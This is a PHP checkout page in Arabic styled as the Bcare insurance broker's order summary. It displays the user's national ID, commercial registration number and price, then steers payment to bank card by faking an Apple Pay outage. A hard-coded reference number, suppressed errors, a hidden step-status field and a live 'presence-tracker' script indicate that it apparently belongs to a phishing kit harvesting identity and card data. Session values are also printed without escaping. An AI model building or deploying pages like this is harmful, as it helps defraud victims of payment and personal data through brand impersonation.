<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();
?>
<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ملخص الطلب - بي كير للتأمين</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        .bacOne {
            background-color: #156394;
        }

        .text-primary {
            color: #156394 !important;
        }

        .bg-two {
            background-color: #156394;
        }

        .det {
            background: linear-gradient(180deg, #f8fafc, #fff);
            border: 1px solid #e2e8f0;
            border-radius: 15px;
        }

        .payment-methods-container {
            background: #fff;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid #e2e8f0;
        }

        .payment-option {
            display: flex;
            align-items: center;
            padding: 15px;
            border: 2px solid #f1f5f9;
            border-radius: 12px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
        }

        .payment-option:hover {
            border-color: #cbd5e1;
            background: #f8fafc;
            transform: translateY(-2px);
        }

        .payment-option.active {
            border-color: #149ADE;
            background: #f0f9ff;
            box-shadow: 0 4px 12px rgba(20, 154, 222, 0.1);
        }

        .payment-option input[type="radio"] {
            display: none;
        }

        .payment-icon {
            width: 45px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 15px;
            font-size: 1.8rem;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }

        .payment-info {
            flex-grow: 1;
        }

        .payment-title {
            font-weight: 700;
            font-size: 1rem;
            color: #1e293b;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .payment-subtitle {
            font-size: 0.8rem;
            color: #64748b;
            display: block;
            margin-top: 2px;
        }

        .payment-check {
            width: 22px;
            height: 22px;
            border: 2px solid #cbd5e1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .payment-option.active .payment-check {
            border-color: #149ADE;
            background: #149ADE;
        }

        .payment-check::after {
            content: "\F272";
            font-family: "bootstrap-icons";
            color: #fff;
            font-size: 12px;
            display: none;
        }

        .payment-option.active .payment-check::after {
            display: block;
        }

        .unavailable-badge {
            font-size: 0.7rem;
            background: #ffe4e6;
            color: #e11d48;
            padding: 2px 10px;
            border-radius: 50px;
            font-weight: 700;
        }

        .price-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }

        .price-label {
            color: #64748b;
            font-size: 0.9rem;
        }

        .price-value {
            font-weight: 700;
            color: #1e293b;
        }

        .total-price-box {
            background: #156394;
            color: #fff;
            padding: 15px;
            border-radius: 12px;
            margin-top: 15px;
        }
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body class="bg-light">

    <nav class="d-flex justify-content-center py-3 shadow-sm bg-white">
        <a href="index.php">
            <img src="./assets/Bcare-logo.svg" alt="Bcare Logo" height="40">
        </a>
    </nav>

    <div class="container mt-4" style="max-width: 600px; margin-bottom: 100px;">
        <h4 class="fw-bold text-dark mb-4 text-center">مراجعة بيانات وثيقتك</h4>

        <form action="payment.php" method="post" id="checkoutForm">
            <input type="hidden" name="status" value="5">

            <!-- Insurance Card Box -->
            <div class="bg-white rounded-4 shadow-sm p-4 mb-4 border border-light">
                <div class="text-center mb-4">
                    <div class="bg-light d-inline-block p-3 rounded-circle mb-3">
                        <img src="./assets/<?php echo htmlspecialchars($_SESSION['image']); ?>" width="100"
                            alt="Company Logo">
                    </div>
                    <h5 class="fw-bold text-primary">تم اختيار العرض الأفضل لك</h5>
                </div>

                <div class="info-list">
                    <div class="d-flex justify-content-between py-2 border-bottom border-light">
                        <span class="text-muted">تاريخ بدء الوثيقة</span>
                        <span class="fw-bold"><?php echo $_SESSION['date']; ?></span>
                    </div>

                    <?php if ($_SESSION['type'] == 1): ?>
                        <div class="d-flex justify-content-between py-2 border-bottom border-light">
                            <span class="text-muted">رقم الهوية</span>
                            <span class="fw-bold"><?php echo $_SESSION['ssn']; ?></span>
                        </div>
                        <div class="d-flex justify-content-between py-2 border-bottom border-light">
                            <span class="text-muted">سنة الصنع</span>
                            <span class="fw-bold"><?php echo $_SESSION['createdYear']; ?></span>
                        </div>
                    <?php endif; ?>

                    <?php if ($_SESSION['type'] == 2): ?>
                        <div class="d-flex justify-content-between py-2 border-bottom border-light">
                            <span class="text-muted">اسم الشركة</span>
                            <span class="fw-bold"><?php echo $_SESSION['company']; ?></span>
                        </div>
                        <div class="d-flex justify-content-between py-2 border-bottom border-light">
                            <span class="text-muted">رقم السجل التجاري</span>
                            <span class="fw-bold"><?php echo $_SESSION['comNum']; ?></span>
                        </div>
                    <?php endif; ?>

                    <div class="d-flex justify-content-between py-2">
                        <span class="text-muted">الرقم المرجعي</span>
                        <span class="fw-bold text-secondary">#1703987910</span>
                    </div>
                </div>
            </div>

            <!-- Price Summary -->
            <div class="det p-4 mb-4 shadow-sm">
                <h6 class="fw-bold text-primary mb-3">تفاصيل التكلفة</h6>
                <div class="price-row">
                    <span class="price-label">المجموع الجزئي</span>
                    <span class="price-value"><?php echo number_format((float) $_SESSION['totalprice'] / 1.15, 2); ?>
                        ر.س</span>
                </div>
                <div class="price-row">
                    <span class="price-label">ضريبة القيمة المضافة (15%)</span>
                    <span
                        class="price-value"><?php echo number_format((float) $_SESSION['totalprice'] - ((float) $_SESSION['totalprice'] / 1.15), 2); ?>
                        ر.س</span>
                </div>

                <div class="total-price-box d-flex justify-content-between align-items-center">
                    <span class="fw-bold fs-5">المبلغ الإجمالي</span>
                    <div class="text-end">
                        <span
                            class="fw-bold fs-3"><?php echo number_format((float) $_SESSION['totalprice'], 2); ?></span>
                        <span class="small">ر.س</span>
                    </div>
                </div>
                <p class="text-center mt-3 mb-0" style="font-size: 0.75rem; color: #94a3b8;">شامل جميع الضرائب والرسوم
                </p>
            </div>

            <!-- Payment Methods -->
            <div class="payment-methods-container shadow-sm">
                <h6 class="fw-bold mb-4 text-dark"><i class="bi bi-wallet2 text-primary ms-2"></i>اختر طريقة الدفع</h6>

                <div class="payment-option" onclick="handleApplePay()">
                    <input type="radio" name="payment_method" value="applepay" id="method_applepay">
                    <div class="payment-icon text-dark">
                        <i class="bi bi-apple"></i>
                    </div>
                    <div class="payment-info">
                        <span class="payment-title">Apple Pay <span
                                class="unavailable-badge ms-auto">قريباً</span></span>
                        <span class="payment-subtitle">الدفع السريع لخدمات آبل</span>
                    </div>
                    <div class="payment-check"></div>
                </div>

                <div class="payment-option active" onclick="selectCardPayment()">
                    <input type="radio" name="payment_method" value="card" id="method_card" checked>
                    <div class="payment-icon text-primary">
                        <i class="bi bi-credit-card-2-front-fill"></i>
                    </div>
                    <div class="payment-info">
                        <span class="payment-title">البطاقة البنكية</span>
                        <span class="payment-subtitle">مدى، فيزا، ماستركارد</span>
                    </div>
                    <div class="payment-check"></div>
                </div>
            </div>

            <!-- Submit -->
            <div class="text-center px-2">
                <button type="submit" name="send" class="btn btn-warning w-100 text-light fw-bold py-3 fs-5 shadow"
                    style="border-radius: 12px;">
                    إتمام الشراء والدفع
                </button>
                <div class="mt-3 d-flex justify-content-center align-items-center gap-2 text-muted">
                    <i class="bi bi-shield-lock-fill fs-5"></i>
                    <span style="font-size: 0.85rem;">نظام دفع آمن ومشفر 256-bit</span>
                </div>
            </div>
        </form>
    </div>

    <footer class="bg-two p-4 mt-5">
        <div class="container text-center">
            <img src="./assets/logo-bacre-white.svg" alt="White Logo" height="30" class="mb-4">
            <p class="text-light small mb-0"> 2025 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين </p>
        </div>
    </footer>

    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        function handleApplePay() {
            Swal.fire({
                title: 'خدمة Apple Pay',
                text: 'عذراً، خدمة آبل باي قيد الصيانة حالياً. يرجى استخدام البطاقة البنكية لإتمام عملية الدفع فوراً.',
                icon: 'info',
                confirmButtonText: 'متابعة ببطاقة الصراف',
                confirmButtonColor: '#156394'
            });
            selectCardPayment();
        }

        function selectCardPayment() {
            document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
            document.querySelector('.payment-option:nth-child(3)').classList.add('active'); // Card option index
            document.getElementById('method_card').checked = true;
        }
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>